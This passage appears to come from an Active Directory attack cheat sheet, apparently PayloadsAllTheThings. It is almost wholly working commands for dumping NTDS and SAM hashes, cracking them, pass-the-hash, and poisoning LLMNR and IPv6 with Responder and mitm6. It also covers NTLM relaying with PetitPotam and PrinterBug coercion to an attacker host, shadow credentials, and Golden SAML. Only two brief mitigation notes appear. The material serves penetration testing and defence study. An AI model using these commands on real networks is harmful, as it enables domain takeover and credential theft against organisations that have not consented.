  cme smb 10.10.0.202 -u username -p password --ntds vss
  ```


### Extract hashes from ntds.dit

then you need to use [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to extract the hashes, use the `LOCAL` options to use it on a retrieved ntds.dit

```java
secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
```

[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) also works remotely

```java
./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
```

* `-pwd-last-set`: Shows pwdLastSet attribute for each NTDS.DIT account.
* `-user-status`: Display whether or not the user is disabled.


### Using Mimikatz sekurlsa

Dumps credential data in an Active Directory domain when run on a Domain Controller.
:warning: Requires administrator access with debug or Local SYSTEM rights

```powershell
sekurlsa::krbtgt
lsadump::lsa /inject /name:krbtgt
```

### Crack NTLM hashes with hashcat

Useful when you want to have the clear text password or when you need to make stats about weak passwords.

Recommended wordlists:
- [Rockyou.txt](https://weakpass.com/wordlist/90)
- [Have I Been Pwned founds](https://hashmob.net/hashlists/info/4169-Have%20I%20been%20Pwned%20V8%20(NTLM))
- [Weakpass.com](https://weakpass.com/)
- Read More at [Methodology and Resources/Hash Cracking.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md)

```powershell
# Basic wordlist
# (-O) will Optimize for 32 characters or less passwords
# (-w 4) will set the workload to "Insane" 
$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r myrules.rule --opencl-device-types 1,2

# Generate a custom mask based on a wordlist
$ git clone https://github.com/iphelix/pack/blob/master/README
$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask
$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask
```

:warning: If the password is not a confidential data (challenges/ctf), you can use online "cracker" like :
- [hashmob.net](https://hashmob.net)
- [crackstation.net](https://crackstation.net)
- [hashes.com](https://hashes.com/en/decrypt/hash)


### NTDS Reversible Encryption

`UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED` ([0x00000080](http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm)), if this bit is set, the password for this user stored encrypted in the directory - but in a reversible form.

The key used to both encrypt and decrypt is the SYSKEY, which is stored in the registry and can be extracted by a domain admin.
This means the hashes can be trivially reversed to the cleartext values, hence the term “reversible encryption”.

* List users with "Store passwords using reversible encryption" enabled
    ```powershell
    Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
    ```

The password retrieval is already handled by [SecureAuthCorp/secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) and mimikatz, it will be displayed as CLEARTEXT. 


## User Hunting

Sometimes you need to find a machine where a specific user is logged in.    
You can remotely query every machines on the network to get a list of the users's sessions.

* CrackMapExec
  ```ps1
  cme smb 10.10.10.0/24 -u Administrator -p 'P@ssw0rd' --sessions
  SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [+] Enumerated sessions
  SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  \\10.10.10.10            User:Administrator
  ```
* Impacket Smbclient
  ```ps1
  $ impacket-smbclient Administrator@10.10.10.10
  # who
  host:  \\10.10.10.10, user: Administrator, active:     1, idle:     0
  ```
* PowerView Invoke-UserHunter
  ```ps1
  # Find computers were a Domain Admin OR a specified user has a session
  Invoke-UserHunter
  Invoke-UserHunter -GroupName "RDPUsers"
  Invoke-UserHunter -Stealth
  ```


## Pass-the-Hash

The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.

* Metasploit
  ```powershell
  use exploit/windows/smb/psexec
  set RHOST 10.2.0.3
  set SMBUser jarrieta
  set SMBPass nastyCutt3r  
  # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
  # NOTE2: Require the full NT hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
  set PAYLOAD windows/meterpreter/bind_tcp
  run
  shell
  ```
* CrackMapExec
  ```powershell
  cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
  ```
* Impacket suite
  ```powershell
  proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
  ```
* Windows RDP and mimikatz
  ```powershell
  sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
  sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the users ntlm hash> /run:"mstsc.exe /restrictedadmin"
  ```

You can extract the local **SAM database** to find the local administrator hash :

```powershell
C:\> reg.exe save hklm\sam c:\temp\sam.save
C:\> reg.exe save hklm\security c:\temp\security.save
C:\> reg.exe save hklm\system c:\temp\system.save
$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```


## OverPass-the-Hash (pass the key)

In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).

### Using impacket

```bash
root@kali:~$ python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
root@kali:~$ export KRB5CCNAME="/root/impacket-examples/velociraptor.ccache"
root@kali:~$ python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pass

# also with the AES Key if you have it
root@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com

root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
root@kali:~$ klist
```

### Using Rubeus

```powershell
# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

# More stealthy variant, but requires the AES256 hash
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```


## Capturing and cracking Net-NTLMv1/NTLMv1 hashes/tokens

> Net-NTLMv1 (NTLMv1) authentication tokens are used for network authentication (they are derived from a challenge/response DES-based algorithm with the user's NT-hash as symetric keys. 

:information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to **NetNTLMv1 Challenge/Response authentication**. This uses the outdated encryption method DES to protect the NT/LM Hashes.

**Requirements**:
* LmCompatibilityLevel = 0x1: Send LM & NTLM (`reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel`)

**Exploitation**:
* Capturing using Responder: Edit the `/etc/responder/Responder.conf` file to include the magical **1122334455667788** challenge
    ```ps1
    HTTPS = On
    DNS = On
    LDAP = On
    ...
    ; Custom challenge.
    ; Use "Random" for generating a random challenge for each requests (Default)
    Challenge = 1122334455667788
    ```
* Fire Responder: `responder -I eth0 --lm`, if `--disable-ess` is set, extended session security will be disabled for NTLMv1 authentication
* Force a callback:
    ```ps1
    PetitPotam.exe Responder-IP DC-IP # Patched around August 2021
    PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users
    ```
* If you got some `NetNTLMv1 tokens`, you can try to **shuck** them online via [Shuck.Sh](https://shuck.sh/) or locally/on-premise via [ShuckNT](https://github.com/yanncam/ShuckNT/) to get NT-hashes corresponding from [HIBP database](https://haveibeenpwned.com/Passwords). If the NT-hash has previously leaked, the NetNTLMv1 is converted to NT-hash ([pass-the-hash](#pass-the-hash) ready) instantly. The [shucking process](https://www.youtube.com/watch?v=OQD3qDYMyYQ&ab_channel=PasswordVillage) works for any NetNTLMv1 with or without ESS/SSP (challenge != `1122334455667788`) but mainly for user account (plaintext previsouly leaked).
    ```ps1
    # Submit NetNTLMv1 online to https://shuck.sh/get-shucking.php
    # Or shuck them on-premise via ShuckNT script:
    $ php shucknt.php -f tokens-samples.txt -w pwned-passwords-ntlm-reversed-ordered-by-hash-v8.bin
	[...]
	10 hashes-challenges analyzed in 3 seconds, with 8 NT-Hash instantly broken for pass-the-hash and 1 that can be broken via crack.sh for free.
	[INPUT] ycam::ad:DEADC0DEDEADC0DE00000000000000000000000000000000:70C249F75FB6D2C0AC2C2D3808386CCAB1514A2095C582ED:1122334455667788
	        [NTHASH-SHUCKED] 93B3C62269D55DB9CA660BBB91E2BD0B
    ```
* If you got some `NetNTLMv1 tokens`, you can also try to crack them via [Crack.Sh](https://crack.sh/) (cloud service when available, more time and potentially chargeable). For this you need to format them to submit them on [Crack.Sh](https://crack.sh/netntlm/). The Converter of [Shuck.Sh](https://shuck.sh/) can be used to convert format easily.
    ```ps1
    # When there is no-ESS/SSP and the challenge is set to 1122334455667788, it's free (0$):
    username::hostname:response:response:challenge -> NTHASH:response
    NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972

    # When there is ESS/SSP or challenge != 1122334455667788, it's chargeable from $20-$200:
    username::hostname:lmresponse+0padding:ntresponse:challenge -> $NETNTLM$challenge$ntresponse
    $NETNTLM$DEADC0DEDEADC0DE$507E2A2131F4AF4A299D8845DE296F122CA076D49A80476E
    ```
* Finaly, if no [Shuck.Sh](https://shuck.sh/) nor [Crack.Sh](https://crack.sh/) can be used, you can try to break NetNTLMv1 with Hashcat / John The Ripper
    ```ps1
    john --format=netntlm hash.txt
    hashcat -m 5500 -a 3 hash.txt # for NetNTLMv1(-ESS/SSP) to plaintext (for user account)
    hashcat -m 27000 -a 0 hash.txt nthash-wordlist.txt # for NetNTLMv1(-ESS/SSP) to NT-hash (for user and computer account, depending on nthash-wordlist quality)
    hashcat -m 14000 -a 3 inputs.txt --hex-charset -1 /usr/share/hashcat/charsets/DES_full.hcchr ?1?1?1?1?1?1?1?1 # for NetNTLMv1(-ESS/SSP) to DES-keys (KPA-attack) of user/computer account with 100% success rate, then regenerate NT-hash with these DES-keys on https://shuck.sh/converter.php.
    ```
* Now you can DCSync using the Pass-The-Hash with the DC machine account

:warning: NetNTLMv1 with ESS / SSP (Extended Session Security / Security Support Provider) changes the final challenge by adding a new alea (!= `1122334455667788`, so chargeable on [Crack.Sh](https://crack.sh/)).

:warning: NetNTLMv1 format is `login::domain:lmresp:ntresp:clientChall`. If the `lmresp` contains a **0's-padding** this means that the token is protected by **ESS/SSP**.

:warning: NetNTLMv1 final challenge is the Responder's challenge itself (`1122334455667788`) when there is no ESS/SSP. If ESS/SSP is enabled, the final challenge is the first 8 bytes of the MD5 hash from the concatenation of the client challenge and server challenge. The details of the algorithmic generation of a NetNTLMv1 are illustrated on the [Shuck.Sh Generator](https://shuck.sh/generator.php) and detailed in [MISCMag#128](https://connect.ed-diamond.com/misc/misc-128/shuck-hash-before-trying-to-crack-it).

:warning: If you get some tokens from other tools ([hostapd-wpe](https://github.com/OpenSecurityResearch/hostapd-wpe) or [chapcrack](https://github.com/moxie0/chapcrack)) in other formats, like tokens starting with the prefix `$MSCHAPv2$`, `$NETNTLM$` or `$99$`, they correspond to a classic NetNTLMv1 and can be converted from one format to another [here](https://shuck.sh/converter.php).


**Mitigations**: 

* Set the Lan Manager authentication level to `Send NTLMv2 responses only. Refuse LM & NTLM`

## Capturing and cracking Net-NTLMv2/NTLMv2 hashes

If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network.

```powershell
# https://github.com/lgandx/Responder
$ sudo ./Responder.py -I eth0 -wfrd -P -v

# https://github.com/Kevin-Robertson/InveighZero
PS > .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]

# https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1
PS > Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
```

Crack the hashes with Hashcat / John The Ripper

```ps1
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
```


## Man-in-the-Middle attacks & relaying

NTLMv1 and NTLMv2 can be relayed to connect to another machine.

| Hash                 | Hashcat | Attack method       |
|---|---|---|
| LM                    | `3000`  | crack/pass the hash  |
| NTLM/NTHash           | `1000`  | crack/pass the hash  |
| NTLMv1/Net-NTLMv1     | `5500`  | crack/relay attack   |
| NTLMv2/Net-NTLMv2     | `5600`  | crack/relay attack   |

Crack the hash with `hashcat`.

```powershell
hashcat -m 5600 -a 0 hash.txt crackstation.txt
```

### MS08-068 NTLM reflection

NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.

> This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim’s own credentials.

* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068

```powershell
msf > use exploit/windows/smb/smb_relay
msf exploit(smb_relay) > show targets
```

### LDAP signing not required and LDAP channel binding disabled

During security assessment, sometimes we don't have any account to perform the audit. Therefore we can inject ourselves into the Active Directory by performing NTLM relaying attack. For this technique three requirements are needed:
* LDAP signing not required (by default set to `Not required`)
* LDAP channel binding is disabled. (by default disabled)
* `ms-DS-MachineAccountQuota` needs to be at least at 1 for the account relayed (10 by default)

Then we can use a tool to poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network such as `Responder` and use `ntlmrelayx` to add our computer.
```bash
# On first terminal
sudo ./Responder.py -I eth0 -wfrd -P -v

# On second terminal
sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer
```
It is required here to relay to LDAP over TLS because creating accounts is not allowed over an unencrypted connection.

### SMB Signing Disabled and IPv4

If a machine has `SMB signing`:`disabled`, it is possible to use Responder with Multirelay.py script to perform an `NTLMv2 hashes relay` and get a shell access on the machine. Also called **LLMNR/NBNS Poisoning**

1. Open the Responder.conf file and set the value of `SMB` and `HTTP` to `Off`.
    ```powershell
    [Responder Core]
    ; Servers to start
    ...
    SMB = Off     # Turn this off
    HTTP = Off    # Turn this off
    ```
2. Run `python  RunFinger.py -i IP_Range` to detect machine with `SMB signing`:`disabled`.
3. Run `python Responder.py -I <interface_card>` 
4. Use a relay tool such as `ntlmrelayx` or `MultiRelay`
    - `impacket-ntlmrelayx -tf targets.txt` to dump the SAM database of the targets in the list. 
    - `python MultiRelay.py -t <target_machine_IP> -u ALL`
5. ntlmrelayx can also act as a SOCK proxy with every compromised sessions.
    ```powershell
    $ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support
    [*] Servers started, waiting for connections
    Type help for list of commands
    ntlmrelayx> socks
    Protocol  Target          Username                  Port
    --------  --------------  ------------------------  ----
    MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
    SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
    MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433

    # You might need to select a target with "-t"
    # smb://, mssql://, http://, https://, imap://, imaps://, ldap://, ldaps:// and smtp://
    impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support
    impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support

    # the socks proxy can then be used with your Impacket tools or CrackMapExec
    $ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1
    $ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth
    $ proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q "SELECT 1"   
    ```

**Mitigations**:

 * Disable LLMNR via group policy
    ```powershell
    Open gpedit.msc and navigate to Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution and set to Enabled
    ```
 * Disable NBT-NS
    ```powershell
    This can be achieved by navigating through the GUI to Network card > Properties > IPv4 > Advanced > WINS and then under "NetBIOS setting" select Disable NetBIOS over TCP/IP
    ```

### SMB Signing Disabled and IPv6

Since [MS16-077](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077) the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.

```powershell
crackmapexec smb $hosts --gen-relay-list relay.txt

# DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6
# -d is the domain name that we filter our request on - the attacked domain
# -i is the interface we have mitm6 listen on for events
mitm6 -i eth0 -d $domain

# spoofing WPAD and relaying NTLM credentials
impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt
impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug

# -ip is the interface you want the relay to run on
# -wh is for WPAD host, specifying your wpad file to serve
# -t is the target where you want to relay to. 
impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
```

### Drop the MIC

> The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP

Check vulnerability with [cve-2019-1040-scanner](https://github.com/fox-it/cve-2019-1040-scanner)

```powershell
python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth
[*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected)
```

- Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD
    ```powershell
    TERM1> python printerbug.py testsegment.local/username@s2012exc.testsegment.local <attacker ip/hostname>
    TERM2> ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
    TERM1> secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
    ```


- Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.
    ```powershell
    # create a new machine account
    TERM1> ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support 
    TERM2> python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6
    TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME

    # connect using the ticket
    export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
    secretsdump.py -k -no-pass second-dc-server.local -just-dc
    ```

### Ghost Potato - CVE-2019-1384

Requirements:
* User must be a member of the local Administrators group
* User must be a member of the Backup Operators group
* Token must be elevated

Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip

```powershell
ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
```

### RemotePotato0 DCOM DCE RPC relay 

> It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine

Requirements:
- a shell in session 0 (e.g. WinRm shell or SSH shell)
- a privileged user is logged on in the session 1 (e.g. a Domain Admin user)

```powershell
# https://github.com/antonioCoco/RemotePotato0/
Terminal> sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016
Terminal> sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
```


### DNS Poisonning - Relay delegation with mitm6

Requirements: 
- IPv6 enabled (Windows prefers IPV6 over IPv4)
- LDAP over TLS (LDAPS)

> ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.

```powershell
git clone https://github.com/fox-it/mitm6.git 
cd /opt/tools/mitm6
pip install .

mitm6 -hw ws02 -d lab.local --ignore-nofqnd
# -d: the domain name that we filter our request on (the attacked domain)
# -i: the interface we have mitm6 listen on for events
# -hw: host whitelist

ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad
ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer
# -ip: the interface you want the relay to run on
# -wh: WPAD host, specifying your wpad file to serve
# -t: the target where you want to relay to

# now granting delegation rights and then do a RBCD
ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administrator  
export KRB5CCNAME=administrator.ccache  
secretsdump.py -k -no-pass target.lab.local  
```

### Relaying with WebDav Trick

> Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB

**Requirement**:
*  WebClient service

**Exploitation**:
* Disable HTTP in Responder: `sudo vi /usr/share/responder/Responder.conf`
* Generate a Windows machine name: `sudo responder -I eth0`, e.g: WIN-UBNW4FI3AP0
* Prepare for RBCD against the DC: `python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support`
* Discover WebDAV services
    ```ps1
    webclientservicescanner 'domain.local'/'user':'password'@'machine'
    crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
    GetWebDAVStatus.exe 'machine'
    ```
* Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4`, the listener host must be specified with the FQDN or full netbios name like `logger.domain.local@80/test.txt`. Specifying the IP results in anonymous auth instead of System. 
  ```ps1
  # PrinterBug
  dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
  SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"

  # PetitPotam
  Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
  Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
  PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
  ```
* Use the created account to ask for a service ticket: 
    ```ps1
    .\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
    .\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
    ls \\PC1.purple.lab\c$
    # IP of PC1: 10.0.0.4
    ```

### Man-in-the-middle RDP connections with pyrdp-mitm
* https://github.com/GoSecure/pyrdp
* https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/
* Usage
```sh
pyrdp-mitm.py <IP>
pyrdp-mitp.py <IP>:<PORT> # with custom port
pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # with custom key and certificate
```
* Exploitation
  * If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge
  * If NLA is disabled, you will obtain the password in plaintext
  * Other features are available such as keystroke recording
* Alternatives
  * S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener	


## UnPAC The Hash

Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User via its certificate.

* Windows
    ```ps1
    # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
    Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
    ```
* Linux
    ```ps1
    # Obtain a TGT by validating a PKINIT pre-authentication
    $ gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
    
    # Use the session key to recover the NT hash
    $ export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
    ```


## Shadow Credentials

> Add **Key Credentials** to the attribute `msDS-KeyCredentialLink` of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.  When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.

:warning: User objects can't edit their own `msDS-KeyCredentialLink` attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists

**Requirements**:
* Domain Controller on (at least) Windows Server 2016
* Domain must have Active Directory `Certificate Services` and `Certificate Authority` configured
* PKINIT Kerberos authentication
* An account with the delegated rights to write to the `msDS-KeyCredentialLink` attribute of the target object

**Exploitation**: 
- From Windows, use [Whisker](https://github.com/eladshamir/Whisker):
  ```powershell
  # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
  Whisker.exe list /target:computername$
  # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
  Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
  Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]
  # Removes a key credential from the target object specified by a DeviceID GUID.
  Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
  ```

- From Linux, use [pyWhisker](https://github.com/ShutdownRepo/pyWhisker):
  ```bash
  # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
  # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
  pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"
  # Removes a key credential from the target object specified by a DeviceID GUID.
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
  ```

**Scenario**:

- **Scenario 1**: Shadow Credential relaying
  - Trigger an NTLM authentication from `DC01` (PetitPotam)
  - Relay it to `DC02` (ntlmrelayx)
  - Edit `DC01`'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)
  - Alternatively : `ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`

- **Scenario 2**: Workstation Takeover with RBCD
  ```ps1
  # Only for C2: Add Reverse Port Forward from 8081 to Team Server 81

  # Set up ntlmrelayx to relay authentication from target workstation to DC 
  proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port 81

  # Execute printer bug to trigger authentication from target workstation 
  proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file

  # Get a TGT using the newly acquired certificate via PKINIT 
  proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR

  # Get a ST (service ticket) for the target account 
  proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v

  # Utilize the ST for future activity 
  export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
  proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
  ```


## Active Directory Federation Services

### ADFS - Golden SAML

**Requirements**:
* ADFS service account
* The private key (PFX with the decryption password)

**Exploitation**:
* Run [mandiant/ADFSDump](https://github.com/mandiant/ADFSDump) on AD FS server as the AD FS service account. It will query the Windows Internal Database (WID): `\\.\pipe\MICROSOFT##WID\tsql\query`
* Convert PFX and Private Key to binary format
    ```ps1
    # For the pfx
    echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin
    # For the private key
    echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin 
    ```
* Create the Golden SAML using [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof), you might need to update the [dependencies](https://github.com/szymex73/ADFSpoof).
    ```ps1
    mkdir ADFSpoofTools
    cd $_
    git clone https://github.com/dmb2168/cryptography.git
    git clone https://github.com/mandiant/ADFSpoof.git 
    virtualenv3 venvADFSSpoof
    source venvADFSSpoof/bin/activate
    pip install lxml
    pip install signxml
    pip uninstall -y cryptography
    cd cryptography
    pip install -e .
    cd ../ADFSpoof
